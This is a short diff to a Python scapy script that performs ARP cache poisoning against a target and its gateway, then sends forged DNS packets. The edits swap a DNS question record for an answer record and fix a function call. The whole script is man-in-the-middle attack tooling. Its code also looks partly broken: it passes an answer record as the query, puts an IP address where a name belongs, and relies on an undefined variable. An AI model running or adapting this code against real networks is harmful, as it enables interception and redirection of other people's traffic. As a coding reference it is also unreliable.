@@ -1,6 +1,6 @@
 from scapy.layers.l2 import *
 from scapy.sendrecv import send, sniff
-from scapy.layers.dns import DNS , DNSQR , IP , UDP
+from scapy.layers.dns import DNS , DNSRR , IP , UDP
 import time
 import sys
 
@@ -12,7 +12,7 @@ def spoofarpcache(targetip, targetmac, sourceip):
     print("yo")
 
 def sendFakeDNS():
-    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="61.13.148.37"))
+    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSRR(qname="61.13.148.37"))
     send(dnsResPacket)
 
 def DNSSpoofing():
@@ -45,7 +45,7 @@ def SingleSniffing(targetip, passerelleip):
             while True :
                 spoofarpcache(targetip, targetmac, gatewayip)
                 spoofarpcache(gatewayip, gatewaymac, targetip)
-                DNSSpoofing(targetip)
+                DNSSpoofing()
                 time.sleep(0.5)
         except KeyboardInterrupt:
             print("ARP spoofing stopped")
